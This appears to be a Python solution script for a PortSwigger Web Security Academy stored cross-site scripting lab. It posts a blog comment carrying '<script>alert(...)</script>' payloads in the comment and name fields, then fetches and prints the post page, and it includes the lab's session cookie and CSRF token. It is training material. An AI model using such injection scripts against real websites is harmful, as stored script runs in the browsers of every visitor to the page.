import requests as req

# Link to lab: https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded

url='https://acba1fef1fbaaafbc00e12d3007a0084.web-security-academy.net/post/comment'
url2 = 'https://acba1fef1fbaaafbc00e12d3007a0084.web-security-academy.net/post?postId=10'
headers={
    'Accept': 'application/vnd.github.v3.text-match+json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'origin': 'https://acba1fef1fbaaafbc00e12d3007a0084.web-security-academy.net',
    'Referer': 'https://acba1fef1fbaaafbc00e12d3007a0084.web-security-academy.net/post?postId=10',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'max-age=0',
    'Te': 'trailers',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded'
    }
cookies=dict(session='PrI9XhLd20dtHbxm9OiWtG6QPc0RyPAM')
data = {
    'csrf': 'kRg8p96oGLXn4xNdjzUyDWOEXOWBY38W',
    'postId':'10',
    'comment':'<script>alert("xss")</script>',
    'name': '<script>alert("xss2")</script>',
    'email': 'test@test.com',
    'website': ''}

response1=req.post(url, headers=headers,cookies=cookies,data=data)
response2=req.get(url2,headers=headers,cookies=cookies)

print(response2.text)
